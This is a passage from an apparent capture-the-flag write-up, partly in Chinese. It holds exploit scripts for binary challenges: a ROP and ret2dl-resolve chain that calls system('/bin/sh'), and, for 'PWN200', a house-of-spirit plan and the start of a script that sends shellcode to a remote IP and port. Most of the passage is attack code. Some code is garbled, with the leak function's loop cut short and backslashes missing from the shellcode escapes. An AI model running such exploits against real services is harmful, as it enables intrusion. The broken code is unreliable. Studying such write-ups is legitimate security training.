        payload0 += l64(pop_rdi_ret)
        payload0 += l64(address)
        payload0 += l64(plt_puts)
        payload0 += l64(adr_entry)
        payload0  = payload0.ljust(0xc8, 'A')
        io.w(payload0)
        io.rl()
    def leak(address, size):
        count       = 0
        buf         = ''
        while count  {}'.format(hex(address), leak_data.encode('hex'))
        leak_data = buf[:size]
        return leak_data
    def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
        payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
        payload += l64(0x0)     # rbx be 0x0
        payload += l64(0x1)     # rbp be 0x1
        payload += l64(jmp2)    # r12 jump to
        payload += l64(arg3)    # r13 -> rdx    arg3
        payload += l64(arg2)    # r14 -> rsi    arg2
        payload += l64(arg1)    # r15 -> edi    arg1
        payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
        payload += 'A' * 56     # junk
        return payload
    adr_linkmap = l64(leak(got_linkmap, 0x8))
    print '[+] leak link_mapt:t' + hex(adr_linkmap)
    # overwrite link_map+0x1c8 0x0, read fake structure
    payload0  = 'A' * junk
    payload0 += com_gadget(com_part1, com_part2, got_read,
            arg1 = 0x0,
            arg2 = adr_linkmap + 0x1c8,
            arg3 = 0x8)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()
    io.w(l64(0x0))
    payload0  = 'A' * junk
    payload0 += com_gadget(com_part1, com_part2, got_read,
            arg1 = 0x0,
            arg2 = adr_stage,
            arg3 = 0x500)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()
    payload0  = 'A' * junk
    payload0 += l64(pop_rbp_ret)
    payload0 += l64(adr_stage)
    payload0 += l64(leave_ret)
    payload0  = payload0.ljust(0xc8, 'A')
    # fake structure
    align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
    payload1  = 'A' * 0x8
    payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
    payload1 += l64(adr_shell)
    payload1 += l64(plt_resolve)
    payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (0x8 * 3))
    payload1 += l64(0xdeadbeef)
    payload1  = payload1.ljust(0x100, 'A')
    align_dyn_sym   = 0x8*3 - (adr_fake_dyn_sym - adr_dyn_sym) % (0x8 * 3)
    payload1 += 'A' * align_rel_plt
    payload1 += l64(got_read)
    payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(0x8*3)*0x100000000 + 0x7)
    payload1  = payload1.ljust(0x208, 'A')
    payload1 += 'A' * align_dyn_sym
    payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
    payload1 += l32(0x12)
    payload1 += l64(0x0)
    payload1 += l64(0x0)
    payload1  = payload1.ljust(0x300, 'A')
    payload1 += 'systemx00'
    payload1  = payload1.ljust(0x400, 'A')
    payload1 += '/bin/shx00'
    payload1  = payload1.ljust(0x500, 'A')
    io.w(payload1)
    io.w(payload0)
    io.rl()
    io.interact()
**  
**
**PWN200**
**Bugs**
1\. 存在栈地址泄露
2\. 在输入`money`时存在栈溢出，可覆盖`malloc`出的指针
**Thinking**
首先泄露出栈地址，然后覆盖堆指针为栈上的可控区域，我们可以精巧的构造这块区域成一个伪造的堆块，之后通过free，这个堆块即被加入到了fastbin中，然后再通过malloc，即可对这个堆块的空间进行任意写，这时只要覆盖栈上的返回地址为一个jmp
rsp，再通过一个short jmp，来执行shellcode，即可获得shell
另外，在构造堆块时，同时要构造好相邻的下一个堆块的头部，使得其prev_inuse == 1（在free的时候会检查）
（其实这个漏洞利用的过程也叫house-of-spirit）
然而。事实上由于我的疏忽，可以直接覆盖指针为got表函数的地址，然后strcpy修改got表函数的地址，即可执行shellcode，sigh:(
**Exploit**
    from zio import *
    target = './pwn200'
    target = ('119.28.63.211', 2333)
    io  = zio(target, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 10000)
    io.rl()
    # x86/bsd/exec: 24 bytes
    shellcode = (
                "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56"
                "x53x54x5fx6ax3bx58x31xd2x0fx05"
                )
    # leak stack
    fake = shellcode.ljust(0x30, 'A')   # shellcode
    io.w(fake)
    io.rtl('A' * (0x30 - len(shellcode)))